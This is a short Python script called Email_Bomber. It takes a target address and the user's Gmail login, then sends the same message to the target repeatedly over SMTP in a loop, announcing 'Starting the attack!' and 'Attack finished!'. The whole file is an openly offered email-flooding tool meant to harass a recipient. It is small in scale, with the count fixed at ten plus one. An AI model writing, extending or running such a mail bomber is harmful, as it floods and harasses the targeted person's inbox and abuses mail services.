#!/usr/bin/env python3
import smtplib
import sys
from getpass import getpass

class Email_Bomber:
	count = 0
	def __init__(self):
		print("Starting...")
		self.target = input("Enter target: ")
	
	def bomb(self):
		self.amount = 10

	def email(self):
		try:
			self.server = 'smtp.gmail.com'
			self.port = 587
			self.fromAddress = input("From: ")
			self.password = getpass("Enter pass: ")
			self.subject = input("Subject: ")
			self.message = input("Message: ")

			self.msg = f'''From: {self.fromAddress}\n To: {self.target}\nSubject: {self.subject}\n\n{self.message}\n'''

			self.s = smtplib.SMTP(self.server, self.port)
			self.s.ehlo()
			self.s.starttls()
			self.s.ehlo()
			self.s.login(self.fromAddress, self.password)
		except Exception as e:
			print(f"Error: {e}")

	def send(self):
		try:
			self.s.sendmail(self.fromAddress, self.target, self.msg)
			self.count += 1
			print(self.count)
		except Exception as e:
			print(f"Error: {e}")


	def attack(self):
		print("Starting the attack!")
		for email in range(self.amount+1):
			self.send()
		self.s.close()
		print("Attack finished!")
		quit()

if __name__ == '__main__':
	bomb = Email_Bomber()
	bomb.bomb()
	bomb.email()
	bomb.attack()